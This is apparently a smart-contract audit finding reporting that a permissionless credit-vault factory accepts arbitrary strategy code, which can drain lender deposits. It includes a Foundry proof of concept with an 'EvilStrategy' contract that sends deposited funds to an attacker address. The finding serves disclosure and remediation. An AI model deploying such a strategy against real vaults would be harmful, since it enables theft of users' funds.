### Title
Factory-deployed credit vaults execute arbitrary strategy code and grant it unlimited access to lender deposits - (File: `contracts/IdleCreditVaultFactory.sol`)

### Summary
`deployCreditVault` is permissionless and lets the caller select the strategy implementation. The factory immediately installs that implementation behind a `TransparentUpgradeableProxy` and executes its initializer. The resulting credit vault grants the strategy unlimited underlying-token allowance during initialization, then forwards every user deposit to the strategy. An attacker can therefore deploy a factory-emitted vault whose strategy transfers deposited assets to the attacker while preserving the expected external interface.

### Finding Description
`deployCreditVault` accepts `strategyData.implementation` without checking it against an approved implementation registry. `_deployBaseCreditVault` passes that arbitrary address to `_deployProxy`, whose `TransparentUpgradeableProxy` constructor delegate-calls the supplied initializer calldata. `IdleCDOCreditVault.initialize` then approves the strategy for unlimited spending of both the underlying token and strategy token. Every `_deposit` concludes by calling `IIdleCDOStrategy(strategy).deposit(_amount)`, allowing malicious strategy code to pull the deposited underlying from the credit vault.

The same unrestricted implementation input exists for the credit vault, queue, write-off escrow, and programmable borrower proxies, but the strategy path provides the most direct theft because it is deliberately authorized to draw underlying from the credit vault.

### Impact Explanation
An unprivileged attacker can deploy a malicious credit vault through the factory, induce a lender to deposit, and receive the full deposited amount in the same transaction. A 1,000,000-unit deposit results in approximately 1,000,000 units being transferred to the attacker. The credit vault may still mint tranche shares, but those shares do not represent recoverable underlying because the strategy already forwarded the assets.

This breaks the fair-deposit and solvency invariants: minted tranche claims no longer correspond to assets held by the vault/strategy system.

### Likelihood Explanation
Exploitation requires an attacker to deploy a malicious implementation and get a user to interact with the resulting vault. Deployment is permissionless, does not require a privileged role, and produces the official `CreditVaultDeployed` event. The malicious implementation only needs to preserve the small interface surface used during deployment and deposits, so it can appear operationally normal until funds are deposited.

### Recommendation
Do not accept arbitrary implementation addresses in `deployCreditVault` or `deployRevolvingCreditVault`. Store approved implementations or deployment bytecode hashes in the factory, and revert when caller-supplied implementations are not approved. Prefer having the factory deploy known implementation bytecode itself. Also verify the proxy admin and expected deployed state after initialization as defense in depth.

### Proof of Concept
The following Foundry test demonstrates the theft path. It uses a malicious standalone strategy implementation that retains the interface methods required by deployment, then sends all deposited underlying to the attacker.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVaultFactory} from "../contracts/IdleCreditVaultFactory.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

contract TestToken is ERC20 {
    constructor() ERC20("Mock USDC", "mUSDC") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract EvilStrategy {
    IERC20Detailed public token;
    address public idleCDO;
    address public immutable thief;

    constructor(address _thief) {
        thief = _thief;
    }

    // Selector-compatible initializer used by IdleCreditVaultFactory.
    function initialize(
        address _underlyingToken,
        address,
        address,
        address,
        string memory,
        uint256
    ) external {
        token = IERC20Detailed(_underlyingToken);
    }

    function strategyToken() external view returns (address) {
        return address(this);
    }

    function symbol() external pure returns (string memory) {
        return "EVIL";
    }

    function decimals() external view returns (uint8) {
        return token.decimals();
    }

    function getApr() external pure returns (uint256) {
        return 0;
    }

    function setAprs(uint256, uint256) external {}

    function setWhitelistedCDO(address _cdo) external {
        idleCDO = _cdo;
    }

    function transferOwnership(address) external {}

    // IdleCDOCreditVault granted this contract unlimited token allowance.
    function deposit(uint256 amount) external returns (uint256) {
        require(msg.sender == idleCDO, "not cdo");
        token.transferFrom(msg.sender, thief, amount);
        return amount;
    }
}

contract FactoryArbitraryImplementationTest is Test {
    function testFactoryStrategyCanStealDeposit() external {
        address treasury = makeAddr("treasury");
        address proxyAdmin = makeAddr("proxyAdmin");
        address factoryAdmin = makeAddr("factoryAdmin");
        address manager = makeAddr("manager");
        address borrower = makeAddr("borrower");
        address feeReceiver = makeAddr("feeReceiver");
        address thief = makeAddr("thief");
        address victim = makeAddr("victim");

        TestToken underlying = new TestToken();
        IdleCreditVaultFactory factoryImpl = new IdleCreditVaultFactory();
        IdleCreditVaultFactory factory = IdleCreditVaultFactory(
            address(new TransparentUpgradeableProxy(
                address(factoryImpl),
                factoryAdmin,
                abi.encodeWithSelector(
                    IdleCreditVaultFactory.initialize.selector,
                    treasury,
                    proxyAdmin
                )
            ))
        );

        IdleCDOEpochVariant cdoImpl = new IdleCDOEpochVariant();
        EvilStrategy strategyImpl = new EvilStrategy(thief);

        IdleCreditVaultFactory.CreditVaultParams memory cvParams =
            IdleCreditVaultFactory.CreditVaultParams({
                implementation: address(cdoImpl),
                limit: 0,
                underlying: address(underlying),
                apr: 0,
                epochDuration: 30 days,
                bufferPeriod: 5 days,
                instantWithdrawDelay: 1 days,
                instantWithdrawAprDelta: 1e18,
                disableInstantWithdraw: true,
                keyringPolicy: 0,
                feeReceiver: feeReceiver,
                fees: 5000,
                managementFee: 500,
                isInterestMinted: false,
                isDepositDuringEpochDisabled: true
            });

        IdleCreditVaultFactory.StrategyData memory strategyData =
            IdleCreditVaultFactory.StrategyData({
                implementation: address(strategyImpl),
                manager: manager,
                borrower: borrower,
                borrowerName: "EvilPool"
            });

        IdleCreditVaultFactory.AncillaryParams memory ancillary =
            IdleCreditVaultFactory.AncillaryParams({
                keyring: address(0),
                queueImplementation: address(0),
                prefundedDepositWindow: 0,
                writeOffImplementation: address(0)
            });

        vm.recordLogs();
        factory.deployCreditVault(cvParams, strategyData, ancillary);

        Vm.Log[] memory logs = vm.getRecordedLogs();
        address creditVault;
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].topics[0] == keccak256(
                "CreditVaultDeployed(address,address,address,address,address,address)"
            )) {
                (creditVault,,,,,) = abi.decode(
                    logs[i].data,
                    (address,address,address,address,address,address)
                );
            }
        }
        assertTrue(creditVault != address(0));

        uint256 amount = 1_000_000e6;
        underlying.mint(victim, amount);
        vm.prank(victim);
        underlying.approve(creditVault, amount);

        vm.prank(victim);
        IdleCDOEpochVariant(creditVault).depositAA(amount);

        assertEq(underlying.balanceOf(thief), amount);
        assertEq(underlying.balanceOf(creditVault), 0);
    }
}
```

Relevant execution path:

- `strategyData.implementation` is caller-controlled: `contracts/IdleCreditVaultFactory.sol:52-57` [1](#0-0) 
- The factory installs and initializes it without approval or bytecode validation: `contracts/IdleCreditVaultFactory.sol:182-193` and `contracts/IdleCreditVaultFactory.sol:280-285` [2](#0-1) [3](#0-2) 
- The credit vault grants the strategy unlimited underlying and strategy-token allowances: `contracts/IdleCDOCreditVault.sol:77-79` [4](#0-3) 
- Each deposit forwards control to the strategy: `contracts/IdleCDOCreditVault.sol:210-212` [5](#0-4)

### Citations

**File:** contracts/IdleCreditVaultFactory.sol (L52-57)
```text
  struct StrategyData {
    address implementation;
    address manager;
    address borrower;
    string borrowerName;
  }
```

**File:** contracts/IdleCreditVaultFactory.sol (L182-193)
```text
    strategy = IdleCreditVault(_deployProxy(
      strategyData.implementation,
      abi.encodeWithSelector(
        IdleCreditVault.initialize.selector,
        cvParams.underlying,
        address(this),
        strategyData.manager,
        strategyData.borrower,
        strategyData.borrowerName,
        cvParams.apr
      )
    ));
```

**File:** contracts/IdleCreditVaultFactory.sol (L280-285)
```text
  function _deployProxy(address implementation, bytes memory data) internal returns (address) {
    return address(new TransparentUpgradeableProxy(
      implementation,
      proxyAdmin,
      data
    ));
```

**File:** contracts/IdleCDOCreditVault.sol (L77-79)
```text
    // Set allowance for strategy
    _allowUnlimitedSpend(_guardedToken, _strategy);
    _allowUnlimitedSpend(_strategyToken, _strategy);
```

**File:** contracts/IdleCDOCreditVault.sol (L210-212)
```text
    // direct deposit in the strategy
    IIdleCDOStrategy(strategy).deposit(_amount);
  }
```
